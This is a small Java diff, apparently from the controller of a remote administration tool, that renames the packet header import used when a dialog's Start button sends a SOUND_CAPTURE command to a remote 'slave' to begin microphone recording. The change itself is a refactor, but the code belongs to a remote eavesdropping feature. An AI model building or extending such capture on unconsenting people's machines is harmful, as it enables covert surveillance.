@@ -19,9 +19,9 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.Packet58Microphone;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 
 @SuppressWarnings({ "serial", "rawtypes", "unchecked" })
@@ -59,7 +59,7 @@ public class FrameRemoteSoundCapture extends BaseDialog {
 		btnStart = new JButton("Start");
 		btnStart.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(new PacketBuilder(Header.SOUND_CAPTURE, new String[] { "true", comboBox.getSelectedItem().toString() }));
+				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.SOUND_CAPTURE, new String[] { "true", comboBox.getSelectedItem().toString() }));
 				btnStart.setEnabled(false);
 				btnStop.setEnabled(true);
 				comboBox.setEnabled(false);
